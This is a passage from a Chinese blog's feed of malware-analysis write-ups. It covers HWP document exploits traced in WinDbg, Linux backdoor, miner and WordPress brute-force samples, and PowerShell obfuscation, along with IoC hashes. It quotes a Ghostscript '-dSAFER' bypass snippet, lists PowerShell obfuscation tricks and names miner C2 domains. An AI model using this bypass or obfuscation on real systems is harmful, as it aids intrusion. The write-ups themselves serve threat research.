Office打开恶意文档，自带的解释器会对参数进行适当的处理，然后跳转到gswin32.exe调用gsdll32.dll文件对ps脚本进行解析。当我们使用带有-dSAFER参数的命令，执行<code>gbb.exe -dSAFER BIN0006.eps</code>的时候，由于验证不合理，造成了漏洞利用，但是我们使用同目录下gswin32.exe并且带上-dSAFER参数参数，可以发现没有创建文件。<br>    <img src="http://hacky.wang/blog/20190719/HR93uvLUshMM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;值得注意的是restore也会造成-dSAFER选项失效。使用<code>{null restore} stopped {pop}</code>即可绕过沙箱。原理如下：PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。null restore会引起类型检查错误（/typecheck error），同时restore的执行将LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。</p><ul><li>参考自：<ul><li><a href="https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/" target="_blank" rel="external">https://ti.360.net/blog/articles/analysis-of-group123-sample-with-hwp-exploitkit/</a></li><li><a href="https://www.freebuf.com/column/182083.html" target="_blank" rel="external">https://www.freebuf.com/column/182083.html</a></li></ul></li><li>IoC:3f92afe96b4cfd41f512166c691197b5</li></ul><h1 id="0x5-类型混淆"><a href="#0x5-类型混淆" class="headerlink" title="0x5 类型混淆"></a>0x5 类型混淆</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先利用HpwScan2查看文件结构，可以发现一共有7个Section流在BodyText中。在2-6号Section中发现大量的雪橇指令，预估存在堆喷射。并且在雪橇指令的终点处发现标志<code>wvrsu</code>。之后预估为shellcode<br>    <img src="http://hacky.wang/blog/20190722/3V4g9sWCdyeR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后开启页堆<code>gflag.exe /I Hwp.exe +hpa</code>。并在程序Hwp.exe启动的时候通过映像劫持挂上windbg。跑起来后，中断在08f9028a出现访问异常，定位于 [edx+54h] 处。这是因为开启了页堆造成的。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected <span class="keyword">and</span> handled.</div><div class="line"><span class="attribute">eax</span>=c0000000 <span class="attribute">ebx</span>=123f8600 <span class="attribute">ecx</span>=0e0c0e0c <span class="attribute">edx</span>=00000000 <span class="attribute">esi</span>=0012ecc4 <span class="attribute">edi</span>=00000000</div><div class="line"><span class="attribute">eip</span>=08f9028a <span class="attribute">esp</span>=0012ec6c <span class="attribute">ebp</span>=122faf80 <span class="attribute">iopl</span>=0         nv up ei pl nz na pe nc</div><div class="line"><span class="attribute">cs</span>=001b  <span class="attribute">ss</span>=0023  <span class="attribute">ds</span>=0023  <span class="attribute">es</span>=0023  <span class="attribute">fs</span>=003b  <span class="attribute">gs</span>=0000             <span class="attribute">efl</span>=00010206</div><div class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted <span class="keyword">to</span> <span class="builtin-name">export</span> symbols <span class="keyword">for</span> C:\Program Files\Hnc\Hwp80\HwpApp.dll - </div><div class="line">HwpApp+0x4028a:</div><div class="line">08f9028a 8b4254          mov     eax,dword ptr [edx+54h] ds:0023:<span class="attribute">00000054</span>=????????</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着查看反汇编代码,看到将[edx+54h]这个未初始化的值赋给eax，然后调用了eax。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u</div><div class="line">HwpApp+<span class="number">0x4028a</span>:</div><div class="line">08f9028a 8b4254          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>+<span class="number">54h</span>]</div><div class="line">08f9028d 896c241c        <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">1Ch</span>],<span class="built_in">ebp</span></div><div class="line">08f90291 ffd0            <span class="keyword">call</span>    <span class="built_in">eax</span></div><div class="line">08f90293 8bd8            <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">08f90295 8d7c241c        <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">esp</span>+<span class="number">1Ch</span>]</div><div class="line">08f90299 e8d2faffff      <span class="keyword">call</span>    HwpApp+<span class="number">0x3fd70</span> (08f8fd70)</div><div class="line">08f9029e 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">08f902a0 747f            <span class="keyword">je</span>      HwpApp+<span class="number">0x40321</span> (08f90321)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后关闭页堆，同时对发生崩溃的call eax下断。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ? <span class="number">08</span>f90291-hwpapp</div><div class="line"><span class="symbol">Evaluate</span> expression: <span class="number">262801</span> = <span class="number">00040291</span></div><div class="line">//</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="keyword">bp </span>hwpapp+<span class="number">40291</span></div><div class="line"><span class="keyword">Bp </span>expression <span class="string">'hwpapp+40291'</span> could not <span class="keyword">be </span>resolved, <span class="keyword">adding </span>deferred <span class="keyword">bp</span></div><div class="line"><span class="keyword">0:000&gt; </span><span class="keyword">bl</span></div><div class="line"><span class="keyword"> </span><span class="number">0</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (hwppp+<span class="number">40291</span>)</div><div class="line"> <span class="number">1</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (hwpapp+<span class="number">40291</span>)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;触发漏洞使得EIP转移到 call    eax {0e0c0e0c}，t跟入。发现是一些雪橇指令，雪橇指令(或者堆喷射原理)见：<a href="https://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">https://blog.csdn.net/magictong/article/details/7391397</a>。找到了这些雪橇指令就相当于定位到shellcode。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ModLoad: 08e20000 08e27000   C:\Program Files\Hnc\Hwp80\DocFiltersRes.KOR</div><div class="line">Breakpoint 1 hit</div><div class="line"><span class="attribute">eax</span>=0e0c0e0c <span class="attribute">ebx</span>=072d0000 <span class="attribute">ecx</span>=0e0c0e0c <span class="attribute">edx</span>=0e0c0e0c <span class="attribute">esi</span>=0012ecc4 <span class="attribute">edi</span>=00000000</div><div class="line"><span class="attribute">eip</span>=04e00291 <span class="attribute">esp</span>=0012ec6c <span class="attribute">ebp</span>=08f98090 <span class="attribute">iopl</span>=0         nv up ei pl nz na pe nc</div><div class="line"><span class="attribute">cs</span>=001b  <span class="attribute">ss</span>=0023  <span class="attribute">ds</span>=0023  <span class="attribute">es</span>=0023  <span class="attribute">fs</span>=003b  <span class="attribute">gs</span>=0000             <span class="attribute">efl</span>=00000206</div><div class="line">HwpApp+0x40291:</div><div class="line">04e00291 ffd0            call    eax &#123;0e0c0e0c&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之前，通过HpwScan2分析得到shellcode的标志<code>wvrsu</code>，通过搜索内存区域<code>s -d 0x3 l?0x7fffffff 0x53525657</code>，得到如下含有<code>wvrsu</code>的堆区。结合雪橇指令滑入的地址eip=0e0c0e0c，定位到0x0ecbfc5b.<code>bp 0x0ecbfc5b</code><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0:000&gt; s -d 0x3 l?0x7fffffff 0x53525657</div><div class="line">073e82bb  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">073fc573  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0b68fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0c89fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0daafc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0ecbfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0fecfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">1123fc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">133afc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">145bfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">157cfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">169dfc5b  53525657 c9335155 0c0e0cba 028a420e  WVRSUQ3<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>B<span class="built_in">..</span></div><div class="line">0:000&gt; r eip</div><div class="line"><span class="attribute">eip</span>=0e0c0e0c</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>bp 0x0ecbfc5b</code>，g到0x0ecbfc5b，可以看到shellcode首先通过cpuid指令，通过去ecx第31位的值是否等于1判断样本是否处于虚拟机中运行。<br>    <img src="http://hacky.wang/blog/20190722/S03tYkkyMl97.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/jOtP1n0hQRV6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在跟0x0eccfca2，<code>r ecx = 0</code>将ecx置0。跟到0x0eccfd21处，发现jmp eax调用了LoadLibraryEx。<code>bp 0x0eccfd21</code>下断。shellcode总计调用了<code>LoadLibraryEx</code>,<code>GlobalAlloc</code>,<code>CreateFileW</code>,<code>GetFileSize</code>,<code>SetFilePointer</code>,<code>ReadFile</code>,<code>CreateProcessA</code>,<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code>,<code>CreateRemoteThread</code>。可以明确知道shellcode使用WriteProcessMemory将第二段shellcode写入notepad中，然后执行新的shellcode。<br>    <img src="http://hacky.wang/blog/20190722/yBRMs9OiWz55.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/z6GMpcUWv4rT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/9SVICvzsq8Ut.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/LmmbJ6uB34dO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/O8i4weQPuuCn.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/GT6MjLQK2VSb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二层shellcode首先在%temp下释放了wsss.dll文件，然后调用了wsss.dll文件。<br>    <img src="http://hacky.wang/blog/20190722/HFqLvWzVooUu.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190722/d31OWJJ0qB0W.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190723/F6RGpo5Xvx1u.png?imageslim" alt="mark"></p><ul><li>IoC:33874577bf54d3c209925c9def880eb9</li></ul><h1 id="0x6-缓冲区溢出"><a href="#0x6-缓冲区溢出" class="headerlink" title="0x6 缓冲区溢出"></a>0x6 缓冲区溢出</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四种是缓冲区溢出漏洞，Hwp2.0 偏移 0x48E 的位置开始是字体结构,前两个字节是字体名称数量,每个字体名称长度为 0x28。在程序读取Hwp2.0的文档的时候，首先使用ConvertFilterFileToWorkFile将文档转化为Hwp3.0，然后调用Set20FontList 子函数处理字体结构。但是在进行复制字体名称的时候，需要将arySrc[0x28]的数据复制到aryDest[0x28]，但是本应在arySrc[0x28]中最后一个字符为’\0’，但是此处为3C。造成了缓冲区异常，从而触发内存访问异常。<br>    <img src="http://hacky.wang/blog/20190726/qRnqOF0CtsIl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当触发异常1后，然后进入SEH处理流程，调用SEH Handler。然后通过pop-ret指令跳转到shellcode</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没有复现成功，参考自：<a href="https://wooyun.js.org/drops/APT%20洋葱狗行动(Operation%20OnionDog" target="_blank" rel="external">https://wooyun.js.org/drops/APT%20洋葱狗行动(Operation%20OnionDog)分析报告.html</a>分析报告.html)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;前言略过，日后补齐~~&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>linux下样本分析小结</title>
    <link href="https://findream.github.io/2019/07/16/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_23_linux%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%B0%8F%E7%BB%93/"/>
    <id>https://findream.github.io/2019/07/16/病毒分析技术_23_linux样本分析小结/</id>
    <published>2019-07-16T07:02:11.000Z</published>
    <updated>2019-08-14T12:03:27.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没事看看linux~~~~学习学习。然后的重点是linux的调试，文件结构，机制。慢慢积累。<br><a id="more"></a></p><h1 id="0x1-Perl脚本样本"><a href="#0x1-Perl脚本样本" class="headerlink" title="0x1 Perl脚本样本"></a>0x1 Perl脚本样本</h1><h2 id="0x1-1-Perl调试"><a href="#0x1-1-Perl调试" class="headerlink" title="0x1.1 Perl调试"></a>0x1.1 Perl调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Perl是一个解释性语言，此处的调试器为自带的Perl调试器。具体调试指令如下：</p><ul><li>启动调试器-d：<code>perl -d Test.pl</code><br>  <img src="http://hacky.wang/blog/20190716/o1DgFc6rditl.png?imageslim" alt="mark"></li><li>插入断点 b：<code>b 行号/函数名 条件</code></li><li>查看断点 L：</li><li>删除断点 B：<code>B 行号</code></li><li>添加监视 w: <code>w $变量名</code></li><li>查看监视 p：<code>p $变量名</code></li><li>删除监视 W：<code>W $变量名</code></li><li>步入操作 s</li><li>步过操作 n</li><li>执行到返回 r</li><li>退出调试 q</li><li>参考自：<a href="https://www.cnblogs.com/royenhome/archive/2010/09/09/1822239.html" target="_blank" rel="external">https://www.cnblogs.com/royenhome/archive/2010/09/09/1822239.html</a></li></ul><h2 id="0x1-2-实例分析"><a href="#0x1-2-实例分析" class="headerlink" title="0x1.2 实例分析"></a>0x1.2 实例分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到样本是一个perl语言编写的脚本，没有加混淆，可读性比较好。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先判断文件/tmp/.Abe0ffdecac1a561be917bfded951a7a是否存在，以及当前进程正在运行<br>    <img src="http://hacky.wang/blog/20190716/Bt4NDhq93ku6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建一个新进程，然后清空三个标准标志符，将之前创建的进程PID写入/tmp/.Abe0ffdecac1a561be917bfded951a7a<br>    <img src="http://hacky.wang/blog/20190716/2MUax55n5ru1.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190716/zIVjoDueJAaG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测配置文件/usr/share/hplip/data/images/24x24/.rc是否存在。如果存在，解析文件中的休眠时间和Hash数据。读取数据暂存到$line变量中，然后利用sqlit函数进行以’,’符号为界限，进行字符串分割，得到onfigHash和DEFAULT_SLEEP_TIME<br>    <img src="http://hacky.wang/blog/20190716/WpN4C7LeO5sw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将收集到的信息，经过加密，形成要发送给C2的数据串，根据返回的结果，解密得到向对应的命令。一共分为四种<code>needregr</code>|<code>newtask</code>|<code>notasks</code>|<code>newreconfig</code>。然后返回到MAIN<br>    <img src="http://hacky.wang/blog/20190716/8YM0N6zo0hIc.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据返回的结果，有m/needregr/ig命令，主要收集用户数据Post给C2，然后升级配置文件<br>    <img src="http://hacky.wang/blog/20190716/Dj0WdtinjDov.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;命令m/newtask/ig是主要是任务命令，主要的操作有Command Execution，Download Execute，Download Execute W Params，Uninstall，killcycle，Update Me<br>    <img src="http://hacky.wang/blog/20190716/i6ncImgAwuX4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;m/notasks/ig参数是休眠参数。<br>    <img src="http://hacky.wang/blog/20190716/bf1NORLX0Gp7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参数m/newreconfig/ig为重置命令参数<br>    <img src="http://hacky.wang/blog/20190716/W7r4q8pyeWc9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190716/m824ROntpI43.png?imageslim" alt="mark"></p><ul><li>IoC：808128d5fb6db3df1a842faeccd9226c</li><li>参考自：<a href="https://mp.weixin.qq.com/s/4t_6vZ4lpEKgViScQJpqDw" target="_blank" rel="external">https://mp.weixin.qq.com/s/4t_6vZ4lpEKgViScQJpqDw</a></li></ul><h1 id="0x2-CoinMiner-linux"><a href="#0x2-CoinMiner-linux" class="headerlink" title="0x2 CoinMiner_linux"></a>0x2 CoinMiner_linux</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linux_c写的，直接拖到IDA中，发现首先检查<code>w.3ei.xyz</code>,<code>w.21-3n.xyz</code>,<code>http://w.21-2n.com</code>三个域名是否可用。<br>    <img src="http://hacky.wang/blog/20190730/Htvj0Tz6eeEq.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后检查<code>/etc/zigw</code>,<code>/tmp/zigw</code>,<code>etc/zjgw</code>是否存在，如果存在关闭进程，删除文件<br>    <img src="http://hacky.wang/blog/20190731/5vWDf3v5hNGY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载migrations，并设置777权限，降低可执行文件执行难度。检查进程列表是否存在其他挖矿进程，然后执行migrations<br>    <img src="http://hacky.wang/blog/20190731/tDrqKTIME3HW.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190731/J6Lcf3SGNSy5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检查crontab.sh是否存在<br>    <img src="http://hacky.wang/blog/20190731/uIAlcuOQaFkG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kill syslog进程，xig进程，systemctI<br>    <img src="http://hacky.wang/blog/20190731/2Jc0TRerRd88.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改host文件，以便访问挖矿网站<br>    <img src="http://hacky.wang/blog/20190731/F6u3KMwvmIBW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空log，命令历史，mail，避免留下痕迹<br><img src="http://hacky.wang/blog/20190731/zi4cqYmXmSU1.png?imageslim" alt="mark"></p><ul><li>0e77987c190b005191d51474e87748ca72cf18ae359fccaab3d6891f541e37ad</li></ul><h1 id="0x3-WordPress爆破"><a href="#0x3-WordPress爆破" class="headerlink" title="0x3 WordPress爆破"></a>0x3 WordPress爆破</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据微步在线情报社区有一篇帖子：35000个WordPress站被攻陷（<a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1774" target="_blank" rel="external">https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1774</a>）。通过对C2的溯源，关联到一个elf样本（<a href="https://s.threatbook.cn/report/file/0f4755f65c495d3711bf22271f85f1ee86da8b7a487e770f769af56e189be48c/?sign=history&amp;env=centos_7_x64" target="_blank" rel="external">https://s.threatbook.cn/report/file/0f4755f65c495d3711bf22271f85f1ee86da8b7a487e770f769af56e189be48c/?sign=history&amp;env=centos_7_x64</a>）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过readelf查看样本信息，发现是一个go语言写的elf样本。使用GolangHelper获取信息。<br>    <img src="http://hacky.wang/blog/20190812/oNFlrOtQ65sf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先样本通过cat获取了系统的版本和CPU信息<br>    <img src="http://hacky.wang/blog/20190812/7T7zBw2TeNRE.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/t4rurkHK3GWx.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/nH4os1PIxYfB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能存在一个释放过程？？？？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能还存在一个创建进程的过程？？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后判断程序是否正在运行<br>    <img src="http://hacky.wang/blog/20190812/Ltbw8n1fvJbV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将获取到的系统版本和CPU信息发送给C2<br>    <img src="http://hacky.wang/blog/20190812/uHb5rCJz80gp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断是否需要升级<br>    <img src="http://hacky.wang/blog/20190812/JsE44xv3gso5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;初始化攻击模块，利用弱口令进行爆破攻击：设计的软件主要有brut，phpmyadmin，wordpress,WHM,Magento,Joomla,Drupal,Cpanel,Bitrix,Opencart<br>    <img src="http://hacky.wang/blog/20190812/y1fM53Wha8kq.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后开始执行爆破攻击<br>    <img src="http://hacky.wang/blog/20190812/KCAe3s3Qi7VA.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/NGtoHiqfvIxY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;没事看看linux~~~~学习学习。然后的重点是linux的调试，文件结构，机制。慢慢积累。&lt;br&gt;
    
    </summary>
    
      <category term="病毒分析" scheme="https://findream.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>样本分析之Powershell</title>
    <link href="https://findream.github.io/2019/07/01/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_22_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E4%B9%8BPowershell/"/>
    <id>https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/</id>
    <published>2019-07-01T07:02:11.000Z</published>
    <updated>2019-08-23T08:46:24.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul><li>基于大小写 ：hacky—&gt;HaCky</li><li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li><li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li><li>反引号：H`aCky—&gt;HaCky</li><li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li><li>基于空格或者ASCII<a id="more"></a></li></ul><h1 id="0x2-勒索软件"><a href="#0x2-勒索软件" class="headerlink" title="0x2 勒索软件"></a>0x2 勒索软件</h1><ul><li>解混淆能清除发现是AES加密<br>  <img src="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim" alt="mark"></li></ul><h1 id="0x3-流量欺骗"><a href="#0x3-流量欺骗" class="headerlink" title="0x3 流量欺骗"></a>0x3 流量欺骗</h1><ul><li>1.宏病毒释放处宏代码，如文件macro.vbs，查看宏代码，发现一段base64编码之后的数据，然后调用powershell执行，怀疑是一个powershell脚本</li><li>2.通过解base得到一个ps1脚本代码，命名为ByPowershell.ps1</li><li>3.通过分析，可以发现ByPowershell.ps1，利用powershell执行了一次-nop -noni -enc 命令，目的在于隐秘执行<br>  <img 